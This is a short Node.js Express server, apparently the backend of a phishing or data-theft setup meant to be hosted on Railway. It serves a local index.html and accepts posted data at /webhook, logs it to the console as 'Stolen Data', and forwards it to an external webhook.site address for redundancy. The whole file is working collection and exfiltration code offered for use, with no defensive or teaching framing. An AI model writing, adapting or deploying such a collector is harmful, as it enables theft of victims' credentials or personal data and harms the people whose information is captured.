const express = require('express');
const app = express();

// Use the variable from Railway, or fallback to a dummy if running locally
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://webhook.site/your-default-id'; 

app.use(express.json());
app.use(express.static('.')); // Serves index.html

app.post('/webhook', (req, res) => {
    const data = req.body;
    
    // Log it to console so you can see it in Railway logs
    console.log("🔥 Stolen Data:", data);
    
    // Optional: Send it to your actual Webhook.site URL too for redundancy
    try {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (e) {
        console.error("Failed to send to webhook site", e);
    }

    res.json({ status: "ok" });
});

app.listen(process.env.PORT || 3000, () => {
    console.log(`Server running on port ${process.env.PORT}`);
});